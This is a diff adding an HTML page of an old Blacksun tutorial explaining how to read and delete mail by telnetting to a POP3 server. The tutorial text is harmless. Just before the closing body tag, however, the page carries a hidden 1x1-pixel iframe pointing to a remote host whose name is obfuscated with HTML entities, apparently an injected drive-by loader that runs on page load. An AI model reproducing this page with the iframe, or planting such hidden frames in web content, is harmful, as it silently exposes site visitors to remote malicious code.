@@ -1,0 +1,155 @@
+<html>
+<head>
+<title>Using POP3 By Hand</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlinks="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>Using POP3 By Hand</b>      I   Written by:     /
+    >                     I                             I                  &lt;
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:barakirs@netvision.net.il">R a v e N</a>                \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<p>Date: 2/1/2000</p>
+<p>Direct questions to: the message board at <a href="http://blacksun.box.sk" target="_blank">blacksun.box.sk</a></p>
+<h3><u>What is POP3?</u></h3>
+<p>POP stands for Post Office Protocol. It is the protocol (a common language
+that is used by computers to exchange information between different hardware
+components, different computers over a network etc'. A computer protocol is
+pretty much the same as a regular human language) used to check any
+non-web-based Email account.</p>
+<p>A web-based Email account is an Email box that can only be used through a
+certain website. During your stay in this website, you are exposed to ads
+which the company who provides you with this mailbox profits from. Web-based
+Email services are always free because instead of paying, you pay the company
+who handles your mailbox by watching these ads (unless this mailbox features
+some extremely special services or features that cost more money).</p>
+<p>Hence, a non-web-based Email account is an account that is accessed using an
+Email client or a regular telnet client, if you know the necessary protocols
+(after you finish reading this tutorial and the Sendmail tutorial, you would
+know how Email works and how to compose and receive Email without the need of
+any program besides a telnet client).</p>
+<p>Non-web-based Email accounts use two protocols - SMTP (Simple Mail Transfer
+Protocol) to send Email and POP (Post Office Protocol) to receive Email. You
+can study the SMTP protocol in the Sendmail tutorial, and as for POP - you'll
+get to learn it right now. In case you're wondering, POP3 is just a newer
+version of POP.</p>
+<h3><u>Why would I want to learn the POP protocol?</u></h3>
+<p>Oh, there are a lot of reasons why you would want to do that. I'll give you a
+couple of examples out of my head:</p>
+<ol type="a">
+<li>Have you ever been mail-bombed? If not, can you imagine how it is to have
+to receive and then delete hundreds or even thousands of messages? Well, no
+more! After you'll read this tutorial you would be able to delete Email right
+off the mail server without having to receive it and then delete it from your
+Email client (some Email clients won't let you group several mails and delete
+all of them in one shot so you have to delete them one by one, which would
+make your job even more difficult).</li>
+<li>You would have the ability to read your Email from anywhere in the world.
+Sure, many people would say "but we can always go to www.readmail.com, enter
+our Email address and our password and we'll be presented with a nice
+interface which will let us read our Email and delete messages from anywhere
+around the world. Why would we want to learn the POP3 protocol instead?" Well,
+there's a serious security problem with using websites such as
+www.readmail.com. For example: some browsers support an option called "form
+completion". The browser records the data you type into forms and then, when
+you return to a form and start filling it out, it will fill all the rest for
+you.<br>
+Now, what happens if you use www.readmail.com on some computer, and then
+someone else comes over and fills in your Email address? That's right! The
+browser will complete the rest of the form, thus reveal your password! This
+was just an example of what insecurities readmail.com might pose.</li>
+<li>The POP3 protocol isn't so complicated. In fact, it's quite easy, so hell,
+why not learn it just for fun, huh?   :-)</li>
+</ol>
+<h3><u>Alright, let's go!</u></h3>
+<p>The first thing you will need is a regular telnet application. No need for
+anything fancy. Unix has a native telnet client (simply type telnet
+hostname/IP to telnet to that hostname or IP into port 23 or telnet
+hostname/IP port to choose a port other than 23). Windows 95 and above also
+come with a telnet application (it's in c:\windows\telnet.exe, but you can
+also press start, run and type telnet to run it, telnet hostname/IP to telnet
+to that hostname or IP and into port 23 or specify a port other than 23 with
+telnet hostname/IP port).</p>
+<p>Next, you need to find your POP3 mail server. Usually it would be something
+like mail.your-isp.net. For example: my ISP is netvision.net.il, so my POP3
+server is located at mail.netvision.net.il. If you already have an Email
+client that is configured correctly for your POP3 box, go to your preferences
+dialog boxes and you should be able to find your incoming mail server address
+there.</p>
+<p>Okay, looks like we're pretty much ready for this. Next thing, we telnet to
+our POP3 server and into port 110 (the default port for POP3). This is what I
+get when I telnet into my POP3 page:</p>
+<blockquote>
+<p>+OK POP3 [194.90.1.6] v7.60 server ready</p>
+</blockquote>
+<p>Okay, looks good so far. Now we need to identify ourselves. We need to supply
+our username and password. Your username would usually be in your Email
+address. For example: my Email address is barakirs@netvision.net.il, therefore
+my username is barakirs. So we type:</p>
+<blockquote>
+<p>user barakirs (or whatever username you have)</p>
+</blockquote>
+<p>And the server replies with:</p>
+<blockquote>
+<p>+OK User name accepted, password please</p>
+</blockquote>
+<p>Next thing, we need a password, right? So we do:</p>
+<blockquote>
+<p>pass your-password</p>
+</blockquote>
+<p>And the server replies with:</p>
+<blockquote>
+<p>+OK Mailbox open, x messages (when x is the number of messages you have in
+your inbox)</p>
+</blockquote>
+<p>Or with:</p>
+<blockquote>
+<p>-ERR Bad login</p>
+</blockquote>
+<p>If we supply the wrong password. Now, we want to see what we have, so we first
+type list to see the list of Emails we currently have (unless, of course, we
+have 0 new messages). For each Email, we would get a separate line which will
+contain a message number (a number that identifies each message) and a number
+that would indicate the size of each message.</p>
+<p>Next thing, we want to read our messages. To do this, we type retr #. Retr
+stands for retrieve. # should be replaces by the message's number. We
+would then get a full message header (see Sendmail tutorial) and the body of
+the message.</p>
+<p>After we read the message, we would probably want to delete it. In order to do
+that, we type dele #. Dele stands for delete. # should be replaced by the
+message's number.</p>
+<p>Once you're finished, type quit to close your session.</p>
+<h3><u>Final notes</u></h3>
+<p>Yup, that's all! Oh, just one more thing - when you log into your POP3
+mailbox, it gets locked up so noone can access it while you're inside. A "lock
+file" is created when you log in and is deleted when you log out, and whenever
+someone tries to log in the server allows him access only if the lock file
+does not exist (which means that there's nobody currently logged in).</p>
+<p>See? It's easy. I hate to tell you "I told you so" but... &nbsp; &nbsp; :-)</p>
+<p>&nbsp;</p>
+<blockquote>
+<p>- EOF -</p>
+</blockquote>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
